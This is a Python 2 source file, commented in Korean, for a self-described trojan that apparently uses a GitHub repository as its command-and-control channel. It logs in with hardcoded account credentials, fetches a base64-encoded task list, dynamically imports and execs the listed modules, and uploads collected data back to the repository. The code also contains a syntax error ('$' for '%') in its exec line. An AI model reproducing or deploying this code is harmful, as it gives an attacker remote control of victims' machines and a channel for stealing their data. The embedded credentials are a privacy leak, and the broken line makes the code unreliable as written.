import json
import base64
import sys
import time
import random
import threading
import Queue
import os

from github3 import login

#트로이 목마를 유일하게 실별
trojan_id="abc"

trojan_config="%s.json" % trojan_id
data_path="data/%s/" % trojan_id
trojan_modules=[]
configured=False
task_queue=Queue.Queue()

# 저장소에 사용자를 인증한 다음 다른 함수에서 사용할 현재repo 와 branch 객체를 가져온다
def connect_to_github():
	gh=login(username="I5Snow",password="sd5796304")
	repo=gh.repository("I5Snow","chapter7")
	branch=repo.branch("master")
	
	return gh, repo, branch

# 원격 저장소에서 파일을 가져오고 로컬에서 그내용을 읽어 들이는 함수
def get_file_contents(filepath):
	
	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print("[*] Found file %s" % filepath)
			blob = repo.blob(filename._json_data['sha'])
			return blob.content

	return None

def get_trojan_config():
	global configured
	config_json = get_file_contents(trojan_config)
	config		= json.loads(base64.b64decode(config_json))
	configured	= True

	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s" $ task['module'])

	return config

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path="data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
	repo.create_file(remote_path, "Commit message", base64.b64encode(data))

	return


